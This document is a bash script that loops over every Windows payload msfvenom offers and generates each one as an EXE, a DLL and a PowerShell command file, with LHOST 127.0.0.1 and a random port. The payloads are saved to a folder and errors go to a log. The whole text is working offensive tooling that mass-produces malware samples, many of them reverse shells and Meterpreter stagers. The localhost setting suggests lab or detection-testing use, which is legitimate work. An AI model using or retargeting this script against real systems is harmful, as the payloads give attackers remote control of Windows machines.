
#!/bin/bash

LHOST="127.0.0.1"
OUTPUT="./payloads"
mkdir -p "$OUTPUT"
LOGFILE="$OUTPUT/failures.log"
> "$LOGFILE"

# Get all windows payloads
payloads=$(msfvenom -l payloads | awk '{print $1}' | grep '^windows')

for p in $payloads; do
  name=$(echo $p | tr '/' '_')
  LPORT=$((RANDOM % 60000 + 1024))  # Random port 1024-61024
  echo "[+] Generating $p on port $LPORT"

  # EXE
msfvenom -p $p LHOST=$LHOST LPORT=$LPORT -f exe -o "$OUTPUT/${name}.exe" 2>>"$LOGFILE"

# DLL
msfvenom -p $p LHOST=$LHOST LPORT=$LPORT -f dll -o "$OUTPUT/${name}.dll" 2>>"$LOGFILE"

# PSH
msfvenom -p $p LHOST=$LHOST LPORT=$LPORT -f psh-cmd -o "$OUTPUT/${name}.ps1" 2>>"$LOGFILE"
done 
echo "[+] Finished. Payloads saved in $OUTPUT"
echo "[!] Check $LOGFILE for any unsupported formats or errors."
